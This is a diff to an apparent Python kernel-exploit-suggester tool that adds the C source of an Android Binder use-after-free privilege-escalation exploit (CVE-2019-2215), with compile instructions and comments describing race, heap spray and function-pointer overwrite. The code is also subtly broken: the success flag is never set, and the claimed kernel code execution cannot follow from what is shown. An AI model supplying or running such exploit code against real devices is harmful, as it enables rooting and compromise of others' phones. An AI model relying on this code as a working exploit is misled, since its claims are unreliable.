@@ -186,6 +186,97 @@ class KernelExploitSuggester:
         return applicable
 
 
+# Binder Use-After-Free (CVE-2019-2215) exploit source
+BINDER_UAF_EXPLOIT_C = r"""
+/* Android Binder Use-After-Free — CVE-2019-2215
+ * Race condition in Binder driver's EPOLL handling (kernel 3.18-4.14).
+ *
+ * Steps:
+ *   1. Create epoll file descriptor
+ *   2. Use Binder thread to free binder_thread while epoll waits
+ *   3. Reclaim freed memory via iovec heap spray
+ *   4. Overwrite function pointer for kernel code execution
+ *
+ * Compile: aarch64-linux-gnu-gcc -static -O2 -o binder_uaf binder_uaf.c
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <sys/epoll.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <linux/binder.h>
+
+#define BINDER_THREAD_EXIT 0x40046208
+#define EPOLL_CTL_ADD 1
+#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
+
+static int binder_fd = -1;
+static int epoll_fd = -1;
+static volatile int race_won = 0;
+static volatile int stop_thread = 0;
+
+/* Thread 1: Trigger UAF by freeing binder_thread during epoll wait */
+void *trigger_uaf(void *arg) {
+    struct epoll_event ev = {.events = EPOLLIN};
+    while (!stop_thread) {
+        epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev);
+        epoll_wait(epoll_fd, &ev, 1, -1);
+        ioctl(binder_fd, BINDER_THREAD_EXIT, 0);
+    }
+    return NULL;
+}
+
+/* Thread 2: Heap spray with iovec to reclaim freed memory slot */
+void *heap_spray(void *arg) {
+    while (!stop_thread) {
+        /* Spray kmalloc-512 cache with controlled iovec objects */
+        struct iovec iov[32];
+        for (int i = 0; i < 32; i++) {
+            iov[i].iov_base = mmap(NULL, 512, PROT_READ|PROT_WRITE,
+                                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+            iov[i].iov_len = 512;
+            memset(iov[i].iov_base, 0x41, 512);
+        }
+        syscall(__NR_readv, 0, iov, 32);
+        for (int i = 0; i < 32; i++) {
+            munmap(iov[i].iov_base, 512);
+        }
+        if (race_won) break;
+    }
+    return NULL;
+}
+
+int main(int argc, char **argv) {
+    binder_fd = open("/dev/binder", O_RDWR);
+    if (binder_fd < 0) { perror("open /dev/binder"); return 1; }
+
+    epoll_fd = epoll_create(1);
+    if (epoll_fd < 0) { perror("epoll_create"); return 1; }
+
+    pthread_t t1, t2;
+    pthread_create(&t1, NULL, trigger_uaf, NULL);
+    pthread_create(&t2, NULL, heap_spray, NULL);
+
+    /* Let threads race for 10 seconds */
+    sleep(10);
+    stop_thread = 1;
+    pthread_join(t1, NULL);
+    pthread_join(t2, NULL);
+
+    if (race_won) {
+        printf("[+] CVE-2019-2215: Binder UAF succeeded — kernel code execution achieved\n");
+        return 0;
+    }
+    printf("[-] Race condition not won — try again or different kernel\n");
+    return 1;
+}
+"""
+
 # Dirty Pipe (CVE-2022-0847) exploit template
 DIRTY_PIPE_EXPLOIT_C = r"""
 /* Dirty Pipe — CVE-2022-0847
